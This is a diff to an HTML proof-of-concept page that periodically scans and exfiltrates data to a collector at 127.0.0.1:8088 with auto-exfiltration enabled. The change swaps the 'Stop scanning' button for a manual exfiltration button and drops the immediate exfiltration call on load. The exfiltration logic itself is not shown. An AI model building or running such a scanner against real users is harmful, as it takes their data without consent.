@@ -408,7 +408,7 @@
       </select>
     </label>
     &nbsp;&nbsp;
-    <button id="stopScan">Stop scanning</button>
+    <button id="manualScan">Manual scan now</button>
   </section>
 
   <pre id="log" style="background:#f7f7f7;padding:10px;border:1px solid #eee;max-height:240px;overflow:auto"></pre>
@@ -777,14 +777,13 @@
     document.getElementById('intervalSel').addEventListener('change', (e) => {
       startScanning(parseInt(e.target.value, 10));
     });
-    document.getElementById('stopScan').addEventListener('click', () => stopScanning());
+    document.getElementById('manualScan').addEventListener('click', () => exfiltrateOnce());
 
     // stop scanning when page is hidden to avoid background exfil
     document.addEventListener('visibilitychange', () => {
       if (document.hidden) { log('Page hidden — pausing scanning'); stopScanning(); }
     });
 
-    exfiltrateOnce();
     startScanning(3000);
     log('PoC loaded — start the collector on 127.0.0.1:8088. Auto-exfiltration enabled.');
   </script>
